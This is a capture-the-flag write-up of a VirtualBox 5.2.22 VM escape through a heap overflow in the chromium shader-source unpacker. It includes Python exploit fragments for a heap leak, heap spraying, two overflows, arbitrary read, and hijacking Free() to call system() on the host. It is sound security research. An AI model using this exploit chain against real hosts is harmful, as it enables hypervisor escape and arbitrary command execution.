---
layout: post
title:  "chromacity: Escaping the VM with newlines"
---

Back in October 2018, I noticed an interesting [blogpost](<https://phoenhex.re/2018-07-27/better-slow-than-sorry>) by Niklas Baumstark about the *chromium* component of *VirtualBox* and decided to take a look at it as well. Within two weeks, I found and reported a dozen of bugs with which I could easily achieve a VM Escape. Unfortunately most of them were duplicates.

By the end of December 2018, a CTF took place at *3C35* and I noticed a [tweet](https://twitter.com/_niklasb/status/1078622130592534528), again by Niklas, who announced that the *VirtualBox* challenge *chromacity* had not yet been solved by anyone. This got me really hyped as I wanted to be the first to capture this flag.

## Table Of Contents

- [Table Of Contents](#table-of-contents)
- [The Challenge](#the-challenge)
  * [The Vulnerability](#the-vulnerability)
  * [Exploitation](#exploitation)
    + [The strategy](#the-strategy)
    + [Heap Information Disclosure](#heap-information-disclosure)
    + [Heap Spraying](#heap-spraying)
    + [The First Overflow](#the-first-overflow)
    + [Finding The Corruption](#finding-the-corruption)
    + [The Second Overflow](#the-second-overflow)
    + [Arbitrary Read Primitive](#arbitrary-read-primitive)
    + [Arbitrary code execution](#arbitrary-code-execution)
    + [Finding system()](#finding-system--)
    + [Capturing The Flag](#capturing-the-flag)
- [Conclusion](#conclusion)
- [Credits](#credits)

## The Challenge

The challenge was to target *VirtualBox* v5.2.22 on 64bit *xubuntu* and escape the VM. A hint was included in the challenge which was simply a picture of the documentation of the API `glShaderSource()`. First, I thought that a bug had been artificially injected into this function for the challenge. However, after looking at its implementation in *chromium*, I realized that I was dealing with a real world vulnerability.

### The Vulnerability

Below is a code excerpt of `src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c`.

```c
void crUnpackExtendShaderSource(void)
{
    GLint *length = NULL;
    GLuint shader = READ_DATA(8, GLuint);
    GLsizei count = READ_DATA(12, GLsizei);
    GLint hasNonLocalLen = READ_DATA(16, GLsizei);
    GLint *pLocalLength = DATA_POINTER(20, GLint);
    char **ppStrings = NULL;
    GLsizei i, j, jUpTo;
    int pos, pos_check;

    if (count >= UINT32_MAX / sizeof(char *) / 4)
    {
        crError("crUnpackExtendShaderSource: count %u is out of range", count);
        return;
    }

    pos = 20 + count * sizeof(*pLocalLength);

    if (hasNonLocalLen > 0)
    {
        length = DATA_POINTER(pos, GLint);
        pos += count * sizeof(*length);
    }

    pos_check = pos;

    if (!DATA_POINTER_CHECK(pos_check))
    {
        crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
        return;
    }

    for (i = 0; i < count; ++i)
    {
        if (pLocalLength[i] <= 0 || pos_check >= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
        {
            crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
            return;
        }

        pos_check += pLocalLength[i];
    }

    ppStrings = crAlloc(count * sizeof(char*));
    if (!ppStrings) return;

    for (i = 0; i < count; ++i)
    {
        ppStrings[i] = DATA_POINTER(pos, char);
        pos += pLocalLength[i];
        if (!length)
        {
            pLocalLength[i] -= 1;
        }

        Assert(pLocalLength[i] > 0);
        jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
        for (j = 0; j < jUpTo; ++j)
        {
            char *pString = ppStrings[i];

            if (pString[j] == '\0')
            {
                Assert(j == jUpTo - 1);
                pString[j] = '\n';
            }
        }
    }

//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);
    cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);

    crFree(ppStrings);
}
```

This method fetches user data using the macro `READ_DATA`. It simply reads from the message that has been sent by the guest using the *HGCM interface* (this message is stored on heap). Then it adjusts the input and hands it over to `cr_unpackDispatch.ShaderSource()`.

The first obvious point of attack is at `crAlloc(count * sizeof(char*))`. The variable `count` is checked whether it is within a certain (positive) range. However, since it is a signed integer, one should also check for negativity. If we choose `count` large enough, for example `0x80000000`, the multiplication with `sizeof(char*)==8` will yield 0 due to an integer overflow (all variables here are 32bit). Ideally, this may result in a heap overflow due to the allocated buffer being too small whereas `count` being too large. However this code is not vulnerable to such an attack, since the loop is not taken at all if `count` is negative (variable `i` is signed, hence its comparison is also signed).

The actual vulnerability is less obvious. It is namely in the first loop, where `pos_check` is incremented by an array of lengths. In every iteration, the position is validated to ensure that the total length is still within bounds. The problem with this code is that `pos_check` is tested to be in-bounds only in the **next iteration**. This means that the last element of the array is never tested and can be arbitrarily large.

What is the effect of this missing validation? Essentially, in the nested loop, `j` represents the index of `pStrings` and is counted from 0 to `pLocalLength[i]`. This loop translates every `\0` byte to a `\n` byte. With an arbitrary length, we can make the loop go out-of-bounds, and since `pString` points to the data within the HGCM message on heap, this is effectively a heap overflow.

### Exploitation

Even though we can't overflow with controllable content, we can still gain arbitrary code execution if we exploit it wisely.

For exploitation, we will use [3dpwn](<https://github.com/niklasb/3dpwn>), a library specifically designed to attack the 3D Acceleration. We will heavily make use of the `CRVBOXSVCBUFFER_t` objects, which has also been targeted in [prior research](<https://github.com/niklasb/3dpwn/blob/master/CVE-2018-3055%2B3085/README.md>). It contains a unique ID, a controllable size, a pointer to the actual data that the guest can write to, and lastly next/previous pointers of the doubly linked list:

```c
typedef struct _CRVBOXSVCBUFFER_t {
    uint32_t uiId;
    uint32_t uiSize;
    void*    pData;
    _CRVBOXSVCBUFFER_t *pNext, *pPrev;
} CRVBOXSVCBUFFER_t;
```

Furthermore, we will also make use of the `CRConnection` object, which contains various function pointers and a pointer to a buffer that the guest can read from.

If we corrupt the former object, we can gain an arbitrary write primitive, and if we corrupt the latter object, we can gain an arbitrary read primitive and arbitrary code execution.

#### The strategy

1. Leak the pointer of a `CRConnection` object.
2. Spray the heap with a lot of `CRVBOXSVCBUFFER_t` objects and save their IDs.
3. Make a hole and execute `glShaderSource()` to occupy the hole with our evil message. The vulnerable code will then make it overflow into an adjacent object - ideally into a `CRVBOXSVCBUFFER_t`. We try to corrupt its ID and size to enable a second heap overflow over which we have more control.
4. Look up the list of IDs and see if one of them disappeared. The ID that is missing should be the one that has been corrupted with newlines.
5. Replace all zero bytes with newlines in this ID to get the corrupted ID.
6. This corrupted object will now have a larger length than originally. We will use this to overflow into a second `CRVBOXSVCBUFFER_t` and make it point to the `CRConnection` object.
7. Finally we can control the content of the `CRConnection` object and as mentioned before, we can corrupt it to enable an arbitrary read primitive and arbitrary code execution.
8. Find out the address of `system()` and overwrite the function pointer `Free()` with it.
9. Run arbitrary commands on host and profit.

#### Heap Information Disclosure

As we are targeting *VirtualBox* v5.2.22, it is not vulnerable to [CVE-2018-3055](<https://www.zerodayinitiative.com/advisories/ZDI-18-684/>) which got patched in v5.2.20. This vulnerability was exploited to leak a  `CRConnection` address, as you can see [here](<https://github.com/niklasb/3dpwn/blob/master/CVE-2018-3055%2B3085/exploit.py#L24>).  So what? Should we use a new infoleak for the sake of the challenge? Or redesign the exploitation strategy?

Surprisingly, the code mentioned above was still able to leak our desired object even in v5.2.22! How is it possible? Was it not fixed properly? If we take a close look, we see that the allocated object has a size of 0x290 bytes, whereas the offset to the connection is at `OFFSET_CONN_CLIENT`, which is 0x248. That's not really out-of-bounds!

```python
msg = make_oob_read(OFFSET_CONN_CLIENT)
leak = crmsg(client, msg, 0x290)[16:24]
```

Interestingly, this worked due to an uninitialized memory bug. Namely, the method `svcGetBuffer()` was requesting heap memory to store the message from guest. However, it didn't clear the buffer. Hence, any API, that was returning back data of the message buffer, could be abused to leak valuable information of the heap to the guest. I assumed that Niklas knew about this bug, thus I decided to use it to solve the challenge. Indeed, a few weeks after the competition, a patch to this bug was pushed and was assigned [CVE-2019-2446](<https://www.zerodayinitiative.com/advisories/ZDI-19-046/>).

#### Heap Spraying

We can spray the heap with `CRVBOXSVCBUFFER_t` using `alloc_buf()` as follows:

```python
bufs = []
for i in range(spray_num):
    bufs.append(alloc_buf(self.client, spray_len))
```

Empirically, I found out that by choosing `spray_len = 0x30` and `spray_num = 0x2000`, their buffers will eventually be consecutive, and the buffer that `pData` is pointing to, is adjacent to an other `CRVBOXSVCBUFFER_t`.

Next, we want to make a hole in the allocations, such that we can occupy it with our evil message.

This is achieved by sending the command `SHCRGL_GUEST_FN_WRITE_READ_BUFFERED` to host, where `hole_pos = spray_num - 0x10`:

```python
hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[hole_pos], "A" * 0x1000, 1337])
```

See the implementation of this command at `src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp`.

#### The First Overflow

Now that we have carefully set up the constellation of the heap, we are ready to allocate our message buffer and trigger the overflow as follows:

```python
msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        + '\0\0\0' + chr(CR_EXTEND_OPCODE)
        + 'aaaa'
        + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE)
        + pack("<I", 0)    # shader
        + pack("<I", 1)    # count
        + pack("<I", 0)    # hasNonLocalLen
        + pack("<I", 0x22) # pLocalLength[0]
        )
crmsg(self.client, msg, spray_len)
```

Notice that we send our message with exactly the same size as the one that has just been freed. Due to how the glibc heap works, it will hopefully take up exactly the same location. Moreover, notice that `count = 1` and remember that only the last length can be arbitrarily large. Since there is only one element, obviously the first is also the last element.

Finally, let `pLocalLength[0] = 0x22`. This is small enough to only corrupt the ID and size fields (we don't want to corrupt `pData`).

How is that calculated?

- Our message is 0x30 bytes long
- The offset of `pString` is at 0x28
- glibc chunk header (64bit) is 0x10 bytes wide
- Both `uiId` and `uiSize` are 32bit unsigned integers
- `pLocalLength[0]` is subtracted by 2 in `crUnpackExtendShaderSource()`

Therefore, we need 0x30-0x28=8 bytes to reach the end of the message, 0x10 bytes to go over the chunk header, and 8 bytes more to overwrite `uiId` and `uiSize`. To compensate the subtraction, we must add 2 bytes more. Overall, this equals to 0x22 bytes.

#### Finding The Corruption

Recall, that the size field is a 32bit unsigned integer and that our chosen size is 0x30 bytes. Hence, this field will hold the value 0x0a0a0a30 after corruption (the three zero bytes have been replaced by the byte 0x0a).

Finding the corrupted ID is slightly more complicated and requires us to traverse the ID list to find out which of them disappeared. We do this by sending a `SHCRGL_GUEST_FN_WRITE_BUFFER` message to every ID as follows:

```python
print("[*] Finding corrupted buffer...")

found = -1

for i in range(spray_num):
    if i != hole_pos:
        try:
            hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [bufs[i], spray_len, 0, ""])
        except IOError:
            print("[+] Found corrupted id: 0x%x" % bufs[i])
            found = bufs[i]
            break

if found < 0:
    exit("[-] Error could not find corrupted buffer.")
```

Finally we manually replace every `\0` with a `\n` byte to match the ID of the corrupted buffer (forgive my python skills):

```python
id_str = "%08x" % found
new_id = int(id_str.replace("00", "0a"), 16)
print("[+] New id: 0x%x" % new_id)
```

Now we have everything we need to make a second overflow, whose content we can finally control. Our ultimate goal is to overwrite the `pData` field and make it point to the `CRConnection` object that we have previously leaked.

#### The Second Overflow

Using `new_id` and size 0x0a0a0a30, we will now corrupt a second `CRVBOXSVCBUFFER_t`. Similar to the previous overflow, this works because these buffers are adjacent to each other. However, this time we overwrite it with our fake object that has ID 0x13371337, size 0x290 and a pointer to `self.pConn`.

```python
try:
    fake = pack("<IIQQQ", 0x13371337, 0x290, self.pConn, 0, 0)
    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [new_id, 0x0a0a0a30, spray_len + 0x10, fake])
    print("[+] Exploit successful.")
except IOError:
    exit("[-] Exploit failed.")
```

Note that `spray_len + 0x10` represents the offset (again we skip 0x10 bytes of the chunk header). After doing this, we can arbitrarily modify the content of the `CRConnection` object. As explained before, this ultimately enables us an arbitrary read primitive and allows us to call anything we want by replacing the `Free()` function pointer.

#### Arbitrary Read Primitive

When issuing a `SHCRGL_GUEST_FN_READ` command, the data from `pHostBuffer` will be sent back to guest. Using our custom 0x13371337 ID, we can overwrite this pointer and its corresponding size with custom ones. Then, we send the `SHCRGL_GUEST_FN_READ` message using the `self.client2` client to trigger our arbitrary read (this is the client ID of the leaked `CRConnection`):

```python
hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_HOSTBUF,   pack("<Q", where)])
hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_HOSTBUFSZ, pack("<I", n)])
res, sz = hgcm_call(self.client2, SHCRGL_GUEST_FN_READ, ["A"*0x1000, 0x1000])
```

#### Arbitrary code execution

Every `CRConnection` object has got function pointers `Alloc()`, `Free()`, etc. to store message buffers of the guest. Furthermore, they take their `CRConnection` object itself as the first argument. This is perfect as it can be be used to kick off a ROP chain for example, or simply call `system()` with arbitrary commands.

To do this, we overwrite the pointer at offset `OFFSET_CONN_FREE` and the content of our desired argument at offset 0 as follows:

```python
hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_FREE, pack("<Q", at)])
hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, 0, cmd])
```

Triggering `Free()` is really simple and only requires us to send any valid message to the host using `self.client2`.

#### Finding system()

We already know an address, namely `crVBoxHGCMFree()` . It is the function pointer that is stored in the `Free()` field. This subroutine is within the module `VBoxOGLhostcrutil` which also contains other stubs to libc. Therefore, we can easily calculate the address of `system()`.

```python
self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE)
print("[+] crVBoxHGCMFree: 0x%x" % self.crVBoxHGCMFree)

self.VBoxOGLhostcrutil = self.crVBoxHGCMFree - 0x20650
print("[+] VBoxOGLhostcrutil: 0x%x" % self.VBoxOGLhostcrutil)

self.memset = self.read64(self.VBoxOGLhostcrutil + 0x22e070)
print("[+] memset: 0x%x" % self.memset)

self.libc = self.memset - 0x18ef50
print("[+] libc: 0x%x" % self.libc)

self.system = self.libc + 0x4f440
print("[+] system: 0x%x" % self.system)
```

#### Capturing The Flag

At this point, we are only one step away from capturing the flag. The flag is stored in a text file at `~/Desktop/flag.txt`. We can see its content by opening the file with any text editor or terminal. During the challenge, you could literally "see" the flag, as a short video was transmitted back to you after submitting the code. *xubuntu* doesn't have *geedit* preinstalled, however a quick google search yield that it should have the text editor *mousepad*.

A little problem that occurred during the first submission is that it crashed the system. I quickly realized that we could not use a string longer than 16 bytes or so, since some pointer is located at this offset. Overwriting it with invalid content would result in a segmentation fault. Therefore, I did a dirty trick and shortened the file path twice, such that it could be opened with less characters:

```python
p.rip(p.system, "mv Desktop a\0")
p.rip(p.system, "mv a/flag.txt b\0")
p.rip(p.system, "mousepad b\0")
```

![](chromacity.gif)

Hurray, after 4-5h I was able to read the flag and was very excited to be the first to solve that challenge (even though it was remotely). Some hours later, the team *Tea Delivers* also succeeded in exploiting this cool bug, congrats to them.

## Conclusion

This challenge was not really hard to solve if you had previously been working with it. As far as I know, this challenge could have been solved without any infoleak by setting up a better heap constellation where we could directly overflow into a `CRConnection` object and modify the `cbHostBuffer` field and finally enable an out-of-bounds read primitive. However under stress and excitement, I was not working very efficiently, and also because of laziness, I decided to use an additional bug to solve the challenge.
Nevertheless, it was a lot of fun, because while there are a bunch of infoleaks in *chromium* (nearly every opcode could disclose stack or heap information), memory corruption bugs are more scarce, thus I was excited to exploit this one.

Last but not least, I would like to express that it was very easy to identify the issue **after** I knew that there was a bug in that code. I believe that I had also been looking at it, but deemed it to be unexploitable. Therefore, it is important that we look at code with this kind of mindset. If you believe that there exists bugs in any code, you will eventually find them. Hence, don't be discouraged and don't think "other people have also been intensively looking at it, I don't think I'll find anything".

Thanks for reading and happy hacking!

## Credits

[niklasb](<https://twitter.com/_niklasb>) - For his prior research and the challenge
